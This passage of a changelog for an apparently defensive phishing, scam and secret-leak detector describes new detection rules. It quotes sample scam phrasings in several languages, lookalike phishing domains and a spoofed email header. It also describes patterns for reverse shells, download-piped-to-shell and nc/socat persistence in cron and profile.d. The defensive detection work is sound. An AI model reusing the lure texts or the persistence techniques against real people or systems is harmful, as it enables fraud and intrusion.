  hyphenated SLD, free-hosting phishing, IP-host with brand in path) already
  knows *which brand* is being impersonated because it matched against the
  BRANDS[] table — yet the output named only the deception. It never said where
  to actually go. A new `brand_canonical()` lookup (108 brands → authoritative
  domain, covering non-obvious cases: `zoom → zoom.us`, `notion → notion.so`,
  `twitter → x.com`, `cashapp → cash.app`, `line → line.me`,
  `telegram → telegram.org`) surfaces the truth alongside every impersonation
  warning as a zero-score-delta `"Legitimate '<brand>': <domain>"` reason. The
  canonical appears in both text and `--json` output. Score is unaffected (delta
  0, informational only); F1 = 1.000 preserved. Tests: 5 new integration checks
  verify typosquat, homoglyph, brand-impersonation, and non-obvious canonical
  cases; the `zoom.us` assertion guards against the common mistake of using the
  wrong regional domain.

## [1.0.3] — 2026-06-13

Socratic probe of the five modules that had no dedicated coverage check this
cycle (network, secrets-Azure, audit-persistence, email-auth, multilingual
text). Each finding below started from a question — "why would this ever be
legitimate?" — and closed a concrete gap without moving F1 off 1.000 on either
the in- or out-of-distribution corpus.

### Added
- **Exoneration — the benign explanation for a heuristic threat**
  (NEW-PERSPECTIVE-EXONERATION). Socratic mirror of the blind-spot lens: that
  one hedges a clean `OK` ("might be wrong, here's what I can't see"); HLSE
  stated *threats* as if certain. But a hyphenated small-business domain or a
  security vendor's "secure-login" site trips heuristics legitimately. On a
  LOG/ALERT-band threat (score 15–59 — where false positives live), the
  `url`/`text`/`email` checks now print `↺ Could be benign:` with the innocent
  explanation **and the falsifying test** ("were you expecting this link; does
  the registrable domain belong to the real brand?"). High-confidence
  BLOCK/ISOLATE threats (homoglyph, `@`-trick, clipboard swap) are *not* hedged.
  Together with blind-spot, HLSE is now honest about uncertainty in both
  directions — clean and threat.
- **`--fail-on <tier>` — the machine consumer's risk gate**
  (NEW-PERSPECTIVE-FAILON). Socratic reframing: five perspectives enriched
  *text for a human*, but HLSE is most deployed as a CI gate / pre-commit hook /
  pipeline filter — read by a *script*, via the *exit code*. The exit code
  collapsed five severity tiers into pass/fail at a hardcoded BLOCK(60),
  imposing the author's risk posture on every consumer. A payments repo may want
  to fail the build at ALERT(40); a noisy docs repo only at ISOLATE(80). New
  `--fail-on log|alert|block|isolate|0-100` sets the score at/above which the
  process exits 1 (default block/60, fully backward-compatible). Applies to all
  single-artifact checks and to `scan` (which now gates its exit on the chosen
  threshold while still *reporting* every finding ≥ ALERT).
- **Epistemic humility — blind-spot disclosure on clean verdicts**
  (NEW-PERSPECTIVE-BLINDSPOT). Socratic reframing ("the only true wisdom is
  knowing you know nothing"): every other signal enriches a *threat* finding,
  but the most dangerous output is a **false `OK`** — the user proceeds
  *because* the tool blessed it. A clean verdict means "no syntactic deception
  markers found", not "safe". The `url`, `text`, and `email` checks now append a
  one-line `ℹ Blind spot:` note on a clean (score 0) result, stating what HLSE
  cannot see — a pixel-perfect clone on a clean domain, a novel scam with no
  known phrasing, a breached-but-legitimate sender — so an OK is not mistaken
  for proof of safety. Shown only on interactive single checks (not batch/CI/
  scan output) and only on clean results; threat verdicts are unaffected.
- **Blast radius — the pivot/correlation lens** (NEW-PERSPECTIVE-BLAST-RADIUS).
  Socratic reframing: a `scan` reported N findings one at a time, but an
  attacker *chains* them — a leaked AWS key **+** a database URL **+** a GitHub
  token is a full pivot (code → cloud → data), materially worse than ten copies
  of one test key. Danger lives in the *diversity of asset classes*, not the
  count. The scan now buckets each secret finding into a coarse asset class
  (cloud-infrastructure, source-control, database, payment, communications,
  AI-provider, private-key) and, when findings span ≥2 classes, emits a
  `⚠ BLAST RADIUS: … span N asset classes (…) — an attacker can pivot …` summary
  (human) plus `asset_classes` / `blast_radius` JSON fields. A single class
  (even many tokens) does not trigger it — the warning marks genuine
  cross-system exposure, not volume.
- **Confidence as a dimension distinct from severity** (NEW-PERSPECTIVE-CONFIDENCE).
  Socratic reframing: two secret findings can share a score (severity) while
  having opposite epistemic status — a fixed-prefix `AKIA…`/`ghp_…` or a
  structural match (JWT, GCP service-account JSON, private-key marker) is
  *near-certain* (~zero false positives), whereas a generic `VAR=value` env line
  or a high-entropy guess is a *heuristic*. The single score conflated "how bad"
  with "how sure". The `secret` subcommand now reports a separate
  **confidence** — `certain` vs `heuristic` — in the human header
  (`… — confidence: heuristic`) and a `"confidence"` JSON field; a heuristic
  finding additionally prints a "confirm it is a live credential" note. A
  generic `PASSWORD=…` (BLOCK 70, heuristic) and an `AKIA…` (ISOLATE 80,
  certain) now read as different on the confidence axis even though both block.
- **Remediation guidance — from detection to response** (NEW-PERSPECTIVE-REMEDIATION).
  Socratic reframing: a detector answers "is this dangerous?", but the user's
  real question at that moment is "what do I do *now*?". Every verdict explained
  **why** (reasons) yet none said **what next**. For actionable verdicts
  (score ≥ 60) the `clipboard`, `secret`, and `email` subcommands now emit a
  concrete next-action — `→ Action: …` in human output and a `"remediation"`
  field in JSON. Highest-stakes first: a clipboard hijack says "Do NOT send
  funds — re-copy and verify every character"; a leaked credential says
  "revoke/rotate now and purge git history"; a spoofed email says "verify the
  sender on a known channel before acting." Sub-threshold (LOG/ALERT < 60)
  verdicts stay quiet — advice is reserved for when action is genuinely needed.

### Security
- **Network: default-route integrity (N2) was documented but never
  implemented** (GAP-NET-N2). The header advertised an N2 "gateway change"
  check, yet `hlse_check_network()` only did ARP/DNS/hosts. Routing injection —
  malware adding a second default route at the same metric as the real gateway
  to silently MITM all traffic — went undetected. Implemented N2 by parsing
  `/proc/net/route`: when ≥2 default routes share the lowest metric, score +55
  and decode both conflicting gateway IPs into the reason. There is no benign
  reason for a client to carry two same-metric default routes (load balancing
  happens at the router, not the host).
- **Network: DNS allow-list hardening** (N3). Added AdGuard, Neustar/UltraDNS,
  and the canonical IPv6 resolvers (Cloudflare/Google/Quad9) to the known-safe
  list, and tightened the RFC-1918 `172.` test to the real `172.16–172.31`
  range (previously any `172.*` was trusted, including routable space).
- **Network: hosts-file pharming coverage** (N4). Expanded the sensitive-domain
  list from 13 to ~50: added Citi/US Bank/Capital One/PNC, Cash App/Zelle/
  Stripe/Square, Bybit/OKX/KuCoin/Crypto.com/Gate.io, Ledger/Trezor/Exodus/
  Trust Wallet/Phantom, Revolut/Wise/N26/ING, KR banks, and Alipay/WeChat Pay.
- **Secrets: Google OAuth client secret** (GAP-SECRET-GOCSPX). Added the
  `GOCSPX-` prefixed Google OAuth2 client secret to the pattern table (unique
  prefix → ~zero FP) — ISOLATE(90).
- **Secrets: newer LLM-provider keys** (GAP-SECRET-LLM). Added Groq (`gsk_`),
  Perplexity (`pplx-`), and xAI/Grok (`xai-`) API-key prefixes (each requires a
  ≥20-char body, so short prefix-words like `xai-dir` are not flagged). DeepSeek
  (`sk-`) and Cohere were deliberately omitted — their prefixes are too generic
  and would raise the false-positive rate.
- **Secrets: bare Telegram bot tokens** (GAP-SECRET-TELEGRAM). A Telegram bot
  token (`<8-10 digit id>:<35 base64url chars>`) is a recognized
  secret-scanning target (TruffleHog/GitGuardian) but HLSE caught it only when
  it carried a `TELEGRAM_BOT_TOKEN=` env prefix. Added a structural check: a
  colon with an 8–10 digit id before and ≥35 base64url chars after — ISOLATE.
  FP-guarded so timestamps (`12:34:56`), ports (`:8080`), and ratios stay clean.
- **Secrets: AWS credentials-file format missed entirely** (GAP-SECRET-AWSINI).
  The canonical `~/.aws/credentials` form uses lowercase keys with spaces
  around `=` (`aws_secret_access_key = wJal…`), but the env-pattern scan is
  case-sensitive (UPPERCASE only) and rejects any space after `=`, so the most
  common real-world AWS secret-key leak format scored OK(0). The bare 40-char
  base64 secret is too generic to flag alone, but anchored to a
  case-insensitive `aws_secret_access_key` key it is high-confidence: match the
  key with a new `ci_strstr`, skip `=`/quotes/whitespace, require ≥40 base64
  chars, suppress placeholders — ISOLATE on a real key.
  - `aws_secret_access_key = <40-char base64>`: OK(0) → flagged (AWS_SECRET_KEY)
  - FP-guarded: `YOUR_SECRET_KEY_HERE_PLACEHOLDER…` and short values stay clean.
- **File: HTML-smuggling masquerade** (GAP-FILE-HTML). An HTML file wearing a
  document/image extension (`invoice.pdf`, `statement.doc` that is really
  `<!DOCTYPE html>…`) opens in the browser and runs embedded JS / reconstructs
  an in-page payload — a top phishing-delivery vector. HTML has no fixed magic
  byte, so it slipped past the byte-signature table. Added a `looks_like_html()`
  detector (case-insensitive, BOM/whitespace-tolerant, matches
  `<!doctype html`/`<html`/`<head`/`<script`/`<svg`/comment lead-in) and an F2
  rule — ALERT(55). Genuine `.html`/`.htm`/`.svg` files are exempt.
- **Secrets: connection-string embedded credentials** (GAP-SECRET-URICREDS). A
  password inside a service URI (`postgres://user:pass@host`,
  `mongodb+srv://user:pass@host`, redis/amqp/mysql/…) is a high-volume
  real-world leak, but was caught only with a `DATABASE_URL=` env prefix. Added
  a structural check over a fixed set of credential-bearing schemes (so a plain
  `https://` link handled by the URL module does not collide) that extracts the
  `user:password@` userinfo and flags a non-trivial password — ISOLATE(80).
  FP-guarded: host-only URIs, `${VAR}` references, and placeholders stay clean.
- **Clipboard: Tezos mislabel + Polkadot/Algorand coverage** (GAP-CLIP-XTZ-DOT-ALGO).
  A Tezos address (`tz1…`, 36-char base58) was *detected* but mislabeled "SOL
  (Solana)" because it fell into the base58 catch-all; Polkadot (47–48-char
  SS58) and Algorand (58-char base32) were missed entirely. Added explicit
  matchers ahead of the Solana catch-all: Tezos now labels correctly, Polkadot
  and Algorand swaps go OK(0)→ISOLATE(95). Solana detection unregressed.
  (`detect_crypto_type` feeds only the clipboard comparison, never the
  scoring path, so this cannot affect phishing/scam F1.)
- **Clipboard: Bitcoin Cash & Cosmos coverage** (GAP-CLIP-BCH-ATOM). The
  clipper-swap detector recognized 14 address formats but not two major coins:
  Bitcoin Cash (`bitcoincash:q…` CashAddr) and Cosmos Hub (`cosmos1…`). A
  swap on either returned OK — the exact silent failure the module exists to
  prevent. Added both with prefix-anchored, zero-FP matchers; cross-type
  copy/paste mismatches are flagged distinctly. ISOLATE(95) on same-type swap.
- **Secrets: JWT bearer tokens** (GAP-SECRET-JWT). A leaked signed JWT
  (`eyJ….eyJ….<sig>`) is a live bearer credential that GitHub/GitGuardian both
  flag, but HLSE returned OK(0). Added detection keyed on the JWT-specific
  shape: the `eyJ` prefix (base64 of `{"`, which every JWT header begins with)
  plus three base64url segments separated by single dots, with minimum segment
  lengths (header≥10, payload≥10, signature≥20) so unsigned 2-segment tokens
  and stray `eyJ…` base64 fragments do not false-positive — BLOCK(60).
- **Secrets: Azure storage AccountKey** (GAP-SECRET-AZURE). A raw Azure
  connection string (`...;AccountKey=<88-char base64>;...`) returned OK unless
  it happened to carry the `AZURE_STORAGE_CONNECTION_STRING=` env prefix. Added
  a structural check that flags an `AccountKey=` followed by ≥40 base64 chars
  (real keys are 88), with placeholder suppression — ISOLATE(85).
- **Audit: system-cron persistence blind spot** (GAP-AUDIT-CRON). A4 scanned
  user crontabs and `/etc/cron.d/` but ignored `/etc/cron.{hourly,daily,weekly,
  monthly}/` and `/etc/crontab` itself — all classic persistence locations.
  Now scans every system cron directory plus the system crontab for the same
  reverse-shell / download-pipe / base64 patterns.
- **Audit: system-wide shell-init backdoor** (GAP-AUDIT-PROFILED). A6 inspected
  the calling user's `~/.bashrc`-family files but not `/etc/profile.d/`, which
  executes for *every* interactive login. Added a scan of `/etc/profile.d/` for
  reverse-shell device paths, download-piped-to-shell, and nc/socat — scored at
  CRITICAL (+50/+55) because the blast radius is all users, not one.

- **URL: obfuscated dotless-IP hosts** (GAP-URL-IPOBF). The IP-host check
  required a `.` in the host, so the classic blocklist-evasion forms — hex
  (`http://0x7f000001/`) and dword-decimal (`http://2130706433/`), both
  decoding to a real IP — fell through to the generic "digit-heavy" heuristic
  at LOG(30). A host with no dot that is all-digits (≥7) or `0x`-hex is never a
  registrable domain (no all-numeric TLD exists), so it is flagged at +40 as a
  named obfuscation signal with effectively zero false positives.
  - `http://0x7f000001/admin`: LOG(30) → BLOCK(70)
  - `http://2130706433/login`: → ISOLATE(85)
  - FP-guarded: `7-eleven.com`, dotted IPs, and `host:port` are unaffected.

### Fixed
- **Clipboard: address-swap missed when an address carried surrounding
  whitespace** (BUG-CLIP-WS). A real clipboard selection routinely includes
  leading/trailing spaces or a trailing newline; an untrimmed address failed
  fixed-length/prefix format detection, so the clipper swap was silently missed
  (`"  1A1z…Divf  "` vs a different BTC address → OK). `hlse_check_crypto_swap`
  now trims both inputs before detection; identical addresses differing only in
  surrounding whitespace are correctly NOT flagged as a swap.
- **Email: folded (RFC 5322 continuation) headers broke From parsing**
  (BUG-EMAIL-FOLD). A spoofed header split across lines —
  `From: PayPal Support\n <service@evil.ru>` — left the address on the folded
  line, so `extract_domain` stopped at the newline (missing `evil.ru`) and the
  display name kept an embedded newline. The spoof scored a weak ALERT(45) with
  a malformed reason instead of BLOCK(65). Added an RFC 5322 §2.2.3 unfolding
  pass (CRLF+WSP → single space) before parsing; legitimate folded headers and
  brand-owns-domain suppression are unaffected.
- **Scan: files ≥1 MB were skipped entirely for secrets** (BUG-SCAN-SIZECAP). A
  log, `.sql` dump, or bundled config just over 1 MB — exactly the files where
  credentials hide — was counted as "scanned" but its contents were never read,
  a misleading silent false-negative. Replaced the hard 1 MB skip with an 8 MB
  per-file byte budget: large files are now scanned (bounded so a pathological
  huge file can't stall the run; a 10 MB file completes in ~0.3 s).
- **Secrets: real keys silently suppressed by far-off "example"/"sample" prose**
  (BUG-SECRET-PLACEHOLDER-WINDOW). The placeholder/example detector scanned 64
  chars of context before a matched secret for marker words — so a live key was
  dropped whenever unrelated prose nearby contained "example", "sample", or a
  run of `xxxxxxxx` (e.g. `Example config for production: AKIA<real key>`,
  common in READMEs, logs, and config comments). Tightened the context window to
  32 chars (a marker must abut the secret as an assignment prefix like
  `example_key =`) and excluded the repetitive-char markers from the context
  scan (an x-filled *token* is still caught by the token-self and distinct-char
  checks). Genuine placeholders (`example_api_key = …`, the AWS doc key,
  `your_api_key_here`) remain suppressed; real keys in prose are now detected.
- **Scan: `.env` and other dotfiles were silently skipped** (BUG-SCAN-DOTFILES).
  The recursive directory scanner skipped every entry whose name began with
  `.`, intending to skip `.`/`..`/`.git` — but this also skipped `.env`,
  `.npmrc`, `.pypirc`, `.git-credentials`, `.aws/credentials`, the *highest*-value
  secret-bearing files. A `scan <repo>` in CI would report clean while a leaked
  `.env` sat right there. Now only `.`/`..` are skipped at the entry level, and
  dot-named **directories** (`.git`, `.svn`, `.hg`) are filtered via the
  existing `SKIP_DIRS` list, so dotfiles are scanned but VCS metadata trees are
  not. (`.env` with embedded DB credentials: silently OK → ISOLATE.)
- **URL: `@`-credential-trick false positive on `@` in query string**
  (FP-URL-ATSIGN). The check searched the *entire* URL after the scheme for an
  `@`, so a benign link with an email in a query parameter
  (`https://example.com/contact?email=user@gmail.com`) was flagged ALERT(45) as
  a credential trick — and the reason fired twice on open-redirect URLs. Bounded
  the search to the authority component (between `://` and the first `/`,`?`,`#`).
  Real `host@evil.ru` tricks still ISOLATE; email-in-query URLs are now clean.

### Changed
- **Email: false positive on legitimate banks** (FP-EMAIL-BANK). The E1
  display-name check listed `"bank"` as an impersonation keyword but
  `brand_owns_domain()` had no bank entries, so `From: Chase Bank
  <noreply@chase.com>` was flagged BLOCK(65) as impersonation. Added canonical
  domains for major US/JP/EU/KR banks (chase.com, bankofamerica.com, smbc.co.jp,
  ing.com, kbstar.com, …) so a bank's own domain is recognized; look-alike
  domains (`chase-secure.ru`) still fire.
- **Email: missing-authentication signal** (E4). Added detection for
  `spf=none ∧ dkim=none ∧ dmarc=none` in Authentication-Results — a sender
  publishing *no* email-auth records is itself a weak spoofing signal
  (+20), distinct from the existing explicit `=fail` checks.
- **Text: Spanish / Portuguese / Arabic scam coverage** (GAP-TEXT-ROMANCE-AR).
  The wordlists covered EN + CJK but returned OK(0) for the entire Spanish,
  Portuguese, and Arabic threat surface. Added fused, scam-defining phrasings
  (not bare keywords, per dual-use discipline) across five categories:
  account-credential asks (`verificar su identidad`, `verificar sua
  identidade`, `تحقق من هويتك`), consequence-threat alerts (`cuenta ha sido
  suspendida`, `para evitar a suspensão`, `سيتم إغلاق حسابك`), prize lures
  (`ha sido seleccionado`, `ganhou um prêmio`, `ربحت جائزة`), rental-scam
  key-mailing (`le enviaremos las llaves por correo` + `depósito … por
  transferencia bancaria`), and money-movement (`enviar dinero`, `transferir
  dinheiro`). Verified no double-scoring (suspension phrases live only in
  FAKE_ALERT_WORDS) and no FP on benign ES/PT prose.

## [1.0.2] — 2026-06-13

### Security
- **File: shebang script masquerading as a document** (GAP-FILE-SHEBANG): the
  magic-byte mismatch check detected binary executables disguised as images
  (PE-as-`.jpg`), but a text script with a `#!` shebang returned NULL magic, so
  `invoice.pdf` / `photo.jpg` / `report.mp4` that were really runnable shell /
  python / perl scripts passed as OK. Added a `Script` magic (`#!`) and an F2
  rule that flags a shebang file wearing a passive document/image/media
  extension. Enriched `DOCUMENT_EXTS` with media containers (`.mp3`, `.mp4`,
  `.mov`, `.mkv`, `.epub`, …).
  - script-as-`invoice.pdf` / `photo.jpg` / `report.mp4`: OK(0) → BLOCK(60)
  - legitimate `.sh` / `.py` scripts and real `%PDF` files unaffected.
- **Supply-chain: ecosystem-alias false-negative** (BUG-PKG-ECOSYSTEM): the
  package typosquat check filtered registries by an exact string match against
  internal labels (`pip`, `npm`, `cargo`, `go`, `gem`), but the CLI help and
  every user's mental model use registry names like **`pypi`**. Running
  `package reqeusts pypi` matched *zero* registries and returned **OK** — a
  silent false-negative on a security check: the user believes they vetted the
  package and got a clean result, then installs the malware. Added
  `canonical_ecosystem()` aliasing (`pypi`/`python`/`pip3` → pip,
  `node`/`nodejs`/`yarn`/`pnpm` → npm, `crates`/`crates.io`/`rust` → cargo,
  `golang` → go, `rubygems`/`ruby`/`bundler` → gem). An **unrecognized**
  ecosystem now scans *all* registries (fail safe) instead of matching nothing.
  - `package reqeusts pypi`: OK(0) → BLOCK(70) ("1 edit from 'requests'")
  - `package numpyy python`, `package djngo pip`, `package raisl rubygems`: now
    correctly BLOCK; `package reqeusts <unknown>` fails safe to BLOCK.
- **Text: CJK account-credential phishing** (GAP-TEXT-CJK): the Japanese /
  Korean / Chinese wordlists covered the emotional/authority scams (ore-ore
  fraud, tax-authority impersonation) but had **no account-credential phishing
  vocabulary** — so the highest-volume global attack class (bank / e-commerce
  "your account was accessed, verify now") scored OK(0) in those languages while
  the identical English lure scored ALERT/BLOCK. Added account-alert phrasings to
  FAKE_ALERT_WORDS (JP `口座が不正利用`/`アカウントが停止されました`, CN
  `账户异常`/`账户将被冻结`, KR `계정이 정지`/`비정상적인 로그인`) and
  payment/credential-update asks to BAIT_WORDS (JP `支払い情報を更新`/`本人確認を完了`,
  CN `验证身份`/`更新支付信息`, KR `본인 인증`/`결제 정보`).
  - 三井住友銀行「口座が不正利用…至急ご確認」: OK(0) → ALERT(50)
  - アマゾンプライム「自動更新に失敗…支払い情報を更新」: OK(0) → LOG(32)
  - Korean「계정이 일시 정지…본인 인증」: OK(0) → ALERT(42)
  - Chinese「账户存在异常活动…验证身份…账户将被冻结」: OK(0) → BLOCK(77)
  - FP-clean: benign CJK (meeting reminders, order confirmations, in-branch ID
    checks) stay SAFE; legitimate payment-update *confirmations* score the same
    mild LOG(24) as their English equivalents (cross-language parity).
- **Text: prospective consequence-threat phishing** (GAP-TEXT-THREAT): account
  phishing manufactures urgency by threatening a FUTURE loss ("your account will
  be suspended … or lose access to your funds"). The engine detected the urgency
  but never booked the threat as a signal, so textbook lures scored only LOG.
  Added the phishing-specific threat+action phrasings to FAKE_ALERT_WORDS:
  `lose access to your account/funds`, `to avoid suspension`, `verify within 24
  hours`, `verify now to avoid`, `confirm now or`, `will be permanently
  disabled`, etc. The **bare** future verbs (`will be suspended/terminated/
  closed/deactivated`) are intentionally excluded — they are dual-use (SaaS
  trials, HR offboarding, bank-inactivity notices all use them legitimately).
  - `"…Coinbase account will be suspended … or lose access to your funds"`:
    LOG(25) → ALERT(55)
  - `"…PayPal account will be locked permanently unless you verify now to avoid
    suspension"`: → BLOCK(61)
  - FP-clean: legitimate trial/subscription/HR/bank "will be terminated/closed/
    deactivated" notices all stay SAFE.

- **URL: brand-impersonation cascade refactor + product-term fusion**
  (GAP-URL-BRANDFUSION): Reworked the brand-impersonation checks in
  `detect_security_hyphenation()` into a single mutually-exclusive cascade so a
  registrable domain contributes at most one brand reason (no more double-scoring
  of `paypal-verify.net`). Added a dedicated `BRAND_SUFFIX_WORDS` list (`enterprise`,
  `excel`, `outlook`, `drive`, `onedrive`, `sharepoint`, `office`, `workspace`,
  `meet`, `calendar`) that flags impersonation only when a product/edition term is
  **fused to a known brand** — these terms are intentionally kept out of the generic
  hyphenation counter because they are common in legitimate domains.
  - `app.slack-enterprise.com/sign-in`: OK(0) → ALERT(45)
  - `microsoftexcel.com/login`: LOG(15) → ALERT(45)
  - `googledrive.net/login`: LOG(15) → ALERT(45)
  - `teams-enterprise-signin.com`: LOG(20) → ALERT(55)
  - `microsoftoutlook.com/webmail`: → ALERT(45)
  - **FP fixed**: `my-enterprise-blog.com` LOG(20) → OK(0) (enterprise no longer a
    generic security word); `hard-drive-recovery.com` and `paypal-verify.net`
    unchanged from prior behaviour.
- **URL: brand+security-word concatenation** (no hyphen): `googleverify.net`,
  `paypalupdate.com` now flagged via the same cascade.
- **URL: trusted brand as direct subdomain of trusted parent**: `outlook.live.com`,
  `outlook.microsoft.com` no longer mis-flagged as subdomain spoofing (only exempt
  when the registrable parent is itself trusted and there is no extra nesting —
  `paypal.com.google.com` still fires).
- **URL: a brand's own `<brand>.com` is canonical** (GAP-URL-OWNDOMAIN): added
  `is_own_brand_dotcom()` — when the registrable SLD exactly equals a known brand
  and the host ends in `.com`, single phishing-path matches no longer raise the
  score (the trademark holder owns its own `.com`). Scales to every brand without
  a per-brand map; `sld_label()` returns the true registrable SLD so the nested
  decoy `paypal.com.evil.com` (SLD `evil`) is correctly excluded.
  - `www.slack.com/signin`, `www.dropbox.com/login`, `paypal.com/signin`:
    LOG(15) → OK(0)
  - Impostors unaffected: `paypal.xyz/login` LOG(35), `paypal-verify.com/signin`
    BLOCK(70), `g00gle.com/login` BLOCK(65), `paypal.com.evil.com/signin` BLOCK(60).
- **URL: hyphenated login-path variants**: added `/sign-in` and `/log-in` to
  `PATH_PATTERNS` (the existing `/signin`, `/login` did not match the hyphenated
  spellings used by phishing kits).
- **URL: BRANDS additions**: `teams` (Microsoft Teams impersonation).
- **Text: rental-scam "mail you the keys"** (GAP-TEXT-RENTAL): added scam-defining
  phrases (`mail you the keys`, `keys will be mailed`, …) to the rental-fraud group.
  Legitimate landlords never mail keys to an unvetted applicant. Replaces the
  dual-use "currently out of the country" travel-status phrasing that caused FPs.
- **Text: romance fund-transfer** (GAP-TEXT-ROMANCE): verb-anchored
  "…to my account" money-movement phrases added to FIN_ACTION_WORDS (e.g.
  `transfer money to my account`), avoiding FPs on benign "send the report to my
  account team". Celebrity crypto-doubling giveaway phrases added to PRIZE_WORDS.

## [1.0.1] — 2026-06-13

### Security
- **Text: bare-domain URL detection in messages** (GAP-TEXT-BAREDOMAIN): Extended
  `hlse_scan()` to extract bare domains (no `http://`/`https://` scheme) from text
  messages and run full URL analysis on them. Group A (inherently suspicious TLDs:
  `.xyz`, `.top`, `.click`, `.tk`, `.pw`, `.su`, `.vip`, `.icu`) are always scanned.
  Group B (common TLDs: `.com`, `.net`, `.org`, `.io`, etc.) are scanned when the
  domain contains a hyphen (the hallmark of lookalike/typosquat domains).
  - `"netflix.com-billing-update.net/pay"` in text: OK(0) → ISOLATE(93)
  - `"accounts.google-security-check.com"` in text: OK(0) → ALERT(55)
  - `"trustwallet-verify.io/confirm"` in text: LOG(27) → ISOLATE(97)
  - `"paypal-update-verify.com/login"` in text: BLOCK(70) ✓
  - `"microsoft-security-alerts.com"` in text: ISOLATE(85) ✓
  - Legitimate domains (`amazon.com`, `google.com`, `zoom.us`, `wikipedia.org`)
    correctly remain SAFE (no hyphen in common TLDs → not scanned).

## [1.0.0] — 2026-06-13

### Security
- **URL: delivery/fee/duty/tracking added to SECURITY_WORDS** (GAP-URL-DELIVERY):
  Added `duty`, `fee`, `track`, `tracking`, `delivery` to SECURITY_WORDS in
  hlse_core.c. `fedex-duty.com`, `ups-fee.com`, `dhl-tracking.net`, and similar
  delivery-fee phishing domains now correctly trigger brand+security_word compound
  detection. `fedex-delivery.com` improved to ALERT(55).
- **Text: customs/duty delivery smishing** (GAP-TEXT-CUSTOMS): Added `duty fee`,
  `pay duty fee`, `customs charge`, `package held at customs`, `parcel held at
  customs`, `shipment held at customs`, `held by customs` to CALLBACK_PHISH_WORDS.
  Full FedEx duty-fee smishing with URL improved from OK(0) to ISOLATE(95).

### Milestone
- **Version 1.0.0**: Detection coverage now spans all major scam categories:
  advance-fee (419, loan, crypto recovery), BEC (wire fraud, CEO fraud, real-estate),
  callback/TOAD/vishing, delivery smishing, hitman hoax, FBI scareware, pump-and-dump,
  pig-butchering (entry through exit), reshipping mule recruitment, utility cutoff,
  romance stranded-abroad, social-media task scam, SIM swap, OTP relay, QR quishing,
  subscription renewal BazarCall, overpayment fraud, and more.

## [0.9.99] — 2026-06-13

### Security
- **Text: FBI/police scareware & hitman hoax detection** (GAP-TEXT-SCAREWARE):
  Added `fbi warning`, `fbi notice`, `fbi alert`, `failure to comply`,
  `flagged for illegal activity`, `law enforcement has been notified`,
  `dea enforcement`, `narcotics department`, `police warning` to AUTHORITY_WORDS.
  FBI ransomware/scareware improved from OK(0) to BLOCK(67).
- **Text: hitman murder-for-hire hoax detection** (GAP-TEXT-HITMAN): Added
  `hired to kill you`, `been hired to kill`, `contract on your life`,
  `hit has been placed on you`, `assassin has been hired` to EMERGENCY_SCAM_WORDS.
  Hitman hoax with Bitcoin demand improved from LOG(20) to ISOLATE(100).
- **Text: "do not contact police" secrecy pressure** (GAP-TEXT-NOPOLICE): Added
  `do not contact the police`, `do not call the police`, `do not report this`,
  `do not go to the police`, `do not involve the police` to SECRECY_WORDS.
  These phrases appear in hitman hoaxes, grandparent scams, and sextortion.

## [0.9.98] — 2026-06-13

### Security
- **Text: 1-833 and 1-855 toll-free robocall prefixes** (GAP-TEXT-TOLLFREE): Added
  `call 1-833`, `call 1-855`, `call +1-833`, `call +1-855`, `at 1-833-`, `at 1-855-`
  to FAKE_ALERT_WORDS. These 2017-era toll-free prefixes are widely abused in
  tech-support, SSA/Medicare, IRS, and student-loan-forgiveness scam robocalls.
  Student loan forgiveness scam improved from LOG(20) to ALERT(50); SSA suspension
  scam BLOCK(66); Medicare insurance fraud scam ALERT(55).

## [0.9.97] — 2026-06-13

### Security
- **Text: pig-butchering exit scam / withdrawal fee fraud** (GAP-TEXT-PIGOUT): Added
  `withdrawal tax`, `withdrawal fee of`, `withdrawal fee required`, `aml compliance fee`,
  `aml fee`, `anti-money laundering fee`, `tax clearance fee`, `clearance fee to release`,
  `fee to unlock your profits`, `before you can withdraw`, `before withdrawal is possible`
  to GROOMING_WORDS. Pig-butchering fake-withdrawal messages improved from OK(0) to ALERT(40).
- **Text: pig-butchering rapport-building opener** (GAP-TEXT-PIGOPEN): Added `crypto mentor`,
  `investment mentor`, `my mentor showed me`, `let me show you how i made` to GROOMING_WORDS.
  Pig-butchering "my crypto mentor taught me" message improved from OK(0) to ALERT(47).
- **Text: social media "task" / likes scam** (GAP-TEXT-TASKSCAM): Added `liking social
  media posts`, `social media tasks`, `get paid to like`, `like and earn`, `earn by
  liking`, `liking posts for pay`, `earn extra cash from home` to GROOMING_WORDS.
  "Earn $800 a day liking social media posts" improved from LOG(20) to ALERT(40).

## [0.9.96] — 2026-06-13

### Security
- **Text: advance-fee loan fraud detection** (GAP-TEXT-LOAN): Added `regardless of
  credit history`, `regardless of credit score`, and related phrases to GROOMING_WORDS.
  "Congratulations, you are pre-approved... pay a processing fee via CashApp" improved
  from LOG(30) to BLOCK(65). Also added PRIZE+GROOMING amplifier (+15) for the
  advance-fee loan fraud pattern.
- **Text: crypto pump-and-dump detection** (GAP-TEXT-PUMP): Added `about to moon`,
  `huge pump`, `whale accumulation`, `100x potential`, `buy before the pump` and related
  phrases to GROOMING_WORDS. Pump-and-dump messages improved from OK(0) to ALERT(40).
- **Text: utility cutoff scam detection** (GAP-TEXT-UTILITY): Added `electricity will
  be disconnected`, `electricity service will be disconnected`, `power will be cut off`,
  `gas will be shut off`, `service will be disconnected today`, `avoid disconnection` and
  related phrases to EMERGENCY_SCAM_WORDS. Full utility scam message improved from
  LOG(28) to BLOCK(68); minimal form (URGENT + 1-800 + disconnect threat) BLOCK(78).
- **Text: 419/deceased-estate fraud detection** (GAP-TEXT-419): Added `estate of the
  late`, `funds of the late`, `the late mr`, `as the beneficiary of the estate` to
  BAIT_WORDS (previously these were absent, leaving classic 419 messages at LOG(30)).
  Full 419 estate-fraud message now BLOCK(74).
- **Text: romance/travel scam "stranded abroad" variant** (GAP-TEXT-ROMANCE): Added
  `i am stuck in`, `stranded in`, `my wallet was stolen`, `need money to return`,
  `i will repay you`, `please send me money` to EMERGENCY_SCAM_WORDS. Romance scam
  message with Western Union request improved from OK(0) to BLOCK(77).
- **Text: reshipping mule recruitment** (GAP-TEXT-RESHIP): Added `reship to our`,
  `reship to a`, `receive packages at your` to GROOMING_WORDS to catch reshipping scam
  messages where "at your address" separates "receive packages" from "reship". Package
  reshipping job scam improved from OK(0) to ALERT(40).

## [0.9.95] — 2026-06-13

### Security
- **URL: SECURITY_WORDS expanded — cancel, order, service, notification**
  (GAP-URL-SECWORDS): `amazon-order-cancel.com`, `paypal-order-cancel.com`,
  `microsoft-service-desk.com`, `apple-notification-center.com` all now
  correctly ALERT(55) via brand+security-word compound detection. Previously
  these scored OK(0) because none of the new words were in SECURITY_WORDS.
